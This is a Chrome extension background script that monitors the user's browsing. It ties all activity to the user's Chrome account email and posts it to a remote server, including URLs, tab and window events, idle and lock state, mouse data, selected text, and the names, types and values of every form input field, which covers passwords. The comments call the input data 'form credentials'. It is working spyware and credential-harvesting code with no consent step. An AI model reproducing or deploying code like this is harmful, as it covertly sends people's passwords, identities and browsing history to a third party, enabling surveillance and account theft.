//Global list to store tab's URL
var urls = [];

// React when a browser action's icon is clicked.
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
	//console.log("urltab: "+changeInfo.url);
	if(changeInfo.url){
		urls[tabId] = changeInfo.url;
	}
    if(changeInfo.status == "complete"){ 
        //do url check
		var url_str = tab.url;
        var patt = new RegExp("chrome://");
        var res = patt.test(url_str);
		if(res == false){
			var ctimestamp = Date.now();
			var datestamp = new Date(ctimestamp).toUTCString();
			//alert(tab.url);
			console.log("URL: "+tab.url+" ~"+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
			//console.log("date: "+ctimestamp+" | "+new Date(ctimestamp).toUTCString()+" | " +new Date(datestamp).getTime());
			//chrome.tabs.executeScript(tab.id, {code: "(" + contentscri.toString() + ")()" });
			syncData(localStorage.getItem('userid'), 'Tab', tab.url, "New Tab", ctimestamp);
		}else{
			//console.log("nooo.....");
		}
    }
});

//Gets User Email on first launch of the app and stores it in LocalStorage
chrome.identity.getProfileUserInfo(function(userInfo){
	if(userInfo.email == ""){
		alert("Please Sign-In to Chrome Browser.");
		storeUserID("NULL");
	}else{
		console.log("User: "+userInfo.email);
		storeUserID(userInfo.email);
	}
});

//If the User changed the email id for the browser then this event is fired
//And the new email id is stored in the LocalStorage
chrome.identity.onSignInChanged.addListener(function(account, signedIn){
	console.log(account.id+" ~ "+signedIn);
	chrome.identity.getProfileUserInfo(function(userInfo){
		if(userInfo.email == ""){
			alert("Please Login to Chrome Browser");
		}else{
			console.log("User: "+userInfo.email);
			storeUserID(userInfo.email);
		}
	});
});

//Function to store the given emailid to LocalStorage
function storeUserID(emailidstr) {
	if (typeof(localStorage) == 'undefined' ) {
	  alert('Your browser does not support HTML5 localStorage. Try upgrading your browser.');
	}
	else {
	  try {
		  if(emailidstr != "NULL"){
			localStorage.setItem("userid", emailidstr); //saves to the database, “key”, “value”
			console.log("Saved USER: "+emailidstr);
			//console.log("SAVED: "+localStorage.getItem('userid'));
			//console.log("hexval: "+getRandomToken());
		  }else{
			var hexval = getRandomToken(); 
			localStorage.setItem("userid", "Chrome"+hexval);
			console.log("Saved USER: "+hexval);
			//console.log("SAVED: "+localStorage.getItem('userid'));
		  }
	  }
	  catch (e) {
		/* if (e == QUOTA_EXCEEDED_ERR) {
		  alert('Quota exceeded!'); //data wasn’t successfully saved due to quota exceed so throw an error
		} */
		alert("Error: LOCAL STORAGE | "+e);
	  }
	  //document.write(localStorage.getItem('userid')); //Hello World!
	  //localStorage.removeItem('userid'); //deletes the matching item from the database
	}
}

//Random Hex Code
function getRandomToken() {
    // E.g. 8 * 16 = 128 bits token
    var randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    var hex = '';
    for (var i = 0; i < randomPool.length; ++i) {
        hex += randomPool[i].toString(16);
    }
    // E.g. db18458e2782b2b77e36769c569e263a53885a9944dd0a861e5064eac16f1a
    return hex.substring(0,12);
}

//Fetch all "Input" fields in the webpage and display them
function contentscri() {
	try {
		inputs = document.getElementsByTagName('input');
		//alert("inputs: "+inputs.length);
		//console.log("Size: "+inputs.length);
		var logformfields = '';
		for (index = 0; index < inputs.length; ++index) {
				//console.log(inputs[index]+":"+inputs[index].value+"\n");				
				logformfields += inputs[index]+"~ "+inputs[index].name+": "+inputs[index].value+" ["+inputs[index].type+"]\n";
				//alert(inputs[index]+":"+inputs[index].value);
		}
		chrome.extension.sendMessage({greeting: "hello", data: ""+logformfields}, function(response) {
			console.log(response);
		});
	} catch(e) {
		console.log(e);
	}
}

//Listener to capture switch between tabs on the browser
chrome.tabs.onActivated.addListener(function(changeInfo) {
	var tab = chrome.tabs.get(changeInfo.tabId, function(tab) {
		var url_str = tab.url;
        var patt = new RegExp("chrome://");
        var res = patt.test(url_str);
		if(res == false){
			var ctimestamp = Date.now();
			var datestamp = new Date(ctimestamp).toUTCString();
			//alert("Moved to: "+tab.url);
			console.log("URL: Switched "+tab.url+" ~"+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
			//console.log("date: "+ctimestamp+" | "+new Date(ctimestamp).toUTCString()+" | " +new Date(datestamp).getTime());	
			//chrome.tabs.executeScript(tab.id, {code: "(" + contentscri.toString() + ")()" });
			syncData(localStorage.getItem('userid'), 'Tab', tab.url, "Tab Switched", ctimestamp);
		}else{
			//console.log("ACT: nooo.....");
		}
    });
});

//Listener to capture tab close
chrome.tabs.onRemoved.addListener(function(tabId, removeInfo){
	try {
		var ctimestamp = Date.now();
		if(urls[tabId]){
			var datestamp = new Date(ctimestamp).toUTCString();
			//alert("Moved to: "+tab.url);
			console.log("URL: Closed "+urls[tabId]+" ~"+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
			//console.log("date: "+ctimestamp+" | "+new Date(ctimestamp).toUTCString()+" | " +new Date(datestamp).getTime());	
			//chrome.tabs.executeScript(tab.id, {code: "(" + contentscri.toString() + ")()" });
			syncData(localStorage.getItem('userid'), 'Tab', urls[tabId], "Tab Closed", ctimestamp);
		} else {
			console.log("URL: Closed "+tabId);
			syncData(localStorage.getItem('userid'), 'Tab', '', "Tab Closed [TabID:"+tabId+"]", ctimestamp);
		}
	} catch(e) {
		console.log(e);
	}
});

//Listener to capture Window closed
chrome.windows.onRemoved.addListener(function(windowId){
	try{
		var ctimestamp = Date.now();
		console.log("Window: Closed "+ new Date(ctimestamp).toUTCString()+" | "+localStorage.getItem('userid'));
		syncData(localStorage.getItem('userid'), 'Window', '', "Window Closed", ctimestamp);
	} catch(e) {
		console.log(e);
	}
});

//Listen to capture Window created
chrome.windows.onCreated.addListener(function(window){
	var ctimestamp = Date.now();
	console.log("Window:"+window.state+" | "+ctimestamp);
	syncData(localStorage.getItem('userid'), 'Window', '', "Window Created", ctimestamp);
});

//Listen to Window Focus changed event
chrome.windows.onFocusChanged.addListener(function(windowId) {
    //console.log("Focus changed. "+windowId);
	var ctimestamp = Date.now();
	if(windowId != -1){
		chrome.windows.get(windowId, function(window){
			console.log("Window: "+window.state+" | "+ctimestamp);
			syncData(localStorage.getItem('userid'), 'Window', '', "Window "+window.state, ctimestamp);
		});
	}else{
		console.log("Window: Possible Minimize | "+ctimestamp);
		syncData(localStorage.getItem('userid'), 'Window', '', "Window -Possible Minimize", ctimestamp);
	}
});

function syncData(emailid, eventtype, urllink, datas, ts){
	var http = new XMLHttpRequest();
	var url = "https://autocode.pythonanywhere.com/BrowserMonitoring/webapi/syncdata";
	//var params = "datas=clicked&ts="+Date.now();
	var params = "emailid="+emailid+"&eventtype="+eventtype+"&urllink="+urllink+"&datas="+datas+"&ts="+ts;
	//alert(params);
	http.open("POST", url, true);

	//Send the proper header information along with the request
	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	//http.setRequestHeader("Content-length", params.length);
	http.setRequestHeader("Connection", "close");

	http.onreadystatechange = function() {//Call a function when the state changes.
		if(http.readyState == 4 && http.status == 200) {
			//alert(http.responseText);
			console.log("Send Data to server: "+http.status+"| "+http.responseText);
		}
	}
	http.send(params);
}

//Invoke the contentscript.js file on page load
chrome.tabs.query({active: true}, function(tab){
	//alert("In this");
	try{
		chrome.tabs.executeScript(tab.id, {file: "contentscript.js"});
	} catch(e){
		console.log(e);
	}
});

//Listen to the system state to identify if its awake / idle / locked
chrome.idle.onStateChanged.addListener(function(newState){
	var ctimestamp = Date.now();
	console.log("Machine State: "+newState+" | "+new Date(ctimestamp).toUTCString());
	syncData(localStorage.getItem('userid'), 'Screen', '', ""+newState, ctimestamp);
});

//Listener to listen to chrome messages. Messages passed from contentscript.js
//The messages are then printed to console
chrome.extension.onMessage.addListener(function(request, sender, callback) {
	//console.log("in extOnReq");
	var ctimestamp = Date.now();
    switch (request.greeting) {
        case 'hello':
            var data = request.data;
            // do something with your form credentials.
			console.log("Input: "+data +" | "+localStorage.getItem('userid'));
			syncData(localStorage.getItem('userid'), 'Input', '', ""+data, ctimestamp);
            break;
		case 'keys':
			var data = request.data;
            // do something with your form credentials.
			console.log("Keys: "+data +" | "+localStorage.getItem('userid'));
            break;
		case 'mouse':
			var data = request.data;
            // do something with your form credentials.
			console.log("Mouse: "+data +" | "+localStorage.getItem('userid'));
			syncData(localStorage.getItem('userid'), 'Mouse', '', ""+data, ctimestamp);
            break;
		case 'selected':
			var data = request.data;
            // do something with your form credentials.
			if(data.trim()!=''){
				console.log("Selected: "+data +" | "+localStorage.getItem('userid'));
				syncData(localStorage.getItem('userid'), 'Selected', '', ""+data, ctimestamp);
			}
			//syncData();
            break;
     }
});
